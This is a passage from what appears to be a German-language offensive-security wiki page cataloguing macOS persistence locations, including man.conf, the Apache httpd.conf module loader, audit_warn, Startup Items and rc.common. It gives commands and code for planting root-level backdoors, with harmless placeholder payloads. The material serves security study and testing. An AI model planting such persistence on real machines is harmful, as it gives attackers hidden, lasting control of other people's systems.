- **`/private/etc/man.conf`**
- Root erforderlich
- **`/private/etc/man.conf`**: Immer wenn man aufgerufen wird

#### Beschreibung & Exploit

Die Konfigurationsdatei **`/private/etc/man.conf`** gibt das binary/script an, das beim Öffnen von man-Seiten verwendet wird. Der Pfad zur ausführbaren Datei kann so geändert werden, dass jedes Mal, wenn der Benutzer man zum Lesen von Dokumentationen verwendet, eine Backdoor ausgeführt wird.

Zum Beispiel setze in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Erstelle dann `/tmp/view` als:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Sie benötigen root-Rechte und Apache muss laufen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd doesn't have entitlements

#### Location

- **`/etc/apache2/httpd.conf`**
- Root-Rechte erforderlich
- Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Sie können in `/etc/apache2/httpd.conf` angeben, ein Modul zu laden, indem Sie eine Zeile wie die folgende hinzufügen:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Auf diese Weise wird Ihr kompiliertes Modul von Apache geladen. Das Einzige ist, dass Sie entweder **mit einem gültigen Apple-Zertifikat signieren müssen**, oder Sie müssen **ein neues vertrauenswürdiges Zertifikat** im System **hinzufügen** und **es damit signieren**.

Dann können Sie, falls nötig, um sicherzustellen, dass der Server gestartet wird, folgendes ausführen:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Code-Beispiel für die Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein, auditd muss laufen und eine Warnung verursachen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/etc/security/audit_warn`**
- Root-Rechte erforderlich
- **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Du könntest dort also dein payload hinzufügen.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Sie können eine Warnung mit `sudo audit -n` erzwingen.

### Startup Items

> [!CAUTION] > **Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts zu finden sein.**

Das **StartupItem** ist ein Verzeichnis, das sich entweder unter `/Library/StartupItems/` oder `/System/Library/StartupItems/` befinden sollte. Sobald dieses Verzeichnis angelegt ist, muss es zwei bestimmte Dateien enthalten:

1. Ein **rc script**: Ein Shell-Skript, das beim Systemstart ausgeführt wird.
2. Eine **plist file**, konkret benannt `StartupParameters.plist`, die verschiedene Konfigurationsparameter enthält.

Stellen Sie sicher, dass sowohl das rc script als auch die Datei `StartupParameters.plist` korrekt im **StartupItem**-Verzeichnis abgelegt sind, damit der Startvorgang sie erkennt und verwendet.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ich kann diese Komponente auf meinem macOS nicht finden; für mehr Informationen siehe das Writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Von Apple eingeführt ist **emond** ein Logging-Mechanismus, der den Anschein erweckt, unterentwickelt oder möglicherweise aufgegeben worden zu sein, der aber weiterhin zugänglich bleibt. Obwohl er für einen Mac-Administrator nicht besonders nützlich ist, kann dieser obskure Dienst als unauffällige Persistenzmethode für threat actors dienen und von den meisten macOS-Admins wahrscheinlich unbemerkt bleiben.

Für diejenigen, die seine Existenz kennen, ist das Erkennen einer bösartigen Nutzung von **emond** unkompliziert. Der LaunchDaemon des Systems für diesen Dienst sucht in einem einzigen Verzeichnis nach auszuführenden Skripten. Um dies zu prüfen, kann folgender Befehl verwendet werden:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Ort

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root-Rechte erforderlich
- **Auslöser**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz ist **nicht mehr in macOS installiert**, also wenn du mehr Infos möchtest, siehe das Writeup.

### ~~kext~~

> [!CAUTION]
> Es ist so kompliziert, kext zu installieren, selbst als root, dass ich dies nicht als Methode für Sandbox-Escape oder gar für Persistenz betrachten werde (es sei denn, du hast einen exploit)

#### Ort

Um einen KEXT als Autostart-Element zu installieren, muss er **an einem der folgenden Orte installiert** werden:

- `/System/Library/Extensions`
- KEXT-Dateien, die in das OS X-Betriebssystem eingebaut sind.
- `/Library/Extensions`
- KEXT-Dateien, die von Drittanbieter-Software installiert wurden

Du kannst aktuell geladene kext-Dateien mit auflisten:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Speicherort

- **`/usr/local/bin/amstoold`**
- Root required

#### Beschreibung & Ausnutzung

Anscheinend verwendete die `plist` aus `/System/Library/LaunchAgents/com.apple.amstoold.plist` dieses binary, während sie einen XPC service exponierte... das Problem war, dass das binary nicht existierte, sodass man dort etwas ablegen konnte und beim Aufruf des XPC service das eigene binary ausgeführt wurde.

Ich kann das auf meinem macOS nicht mehr finden.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Speicherort

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root required
- **Trigger**: Wenn der Service ausgeführt wird (selten)

#### Beschreibung & Ausnutzung

Anscheinend wird dieses Skript nicht sehr häufig ausgeführt und ich konnte es auf meinem macOS nicht einmal finden; für weitere Informationen siehe das Writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Das funktioniert nicht in modernen macOS-Versionen**

Es ist außerdem möglich, hier **Befehle abzulegen, die beim Start ausgeführt werden.** Beispiel für ein reguläres rc.common-Skript:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistenztechniken und Tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Referenzen

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
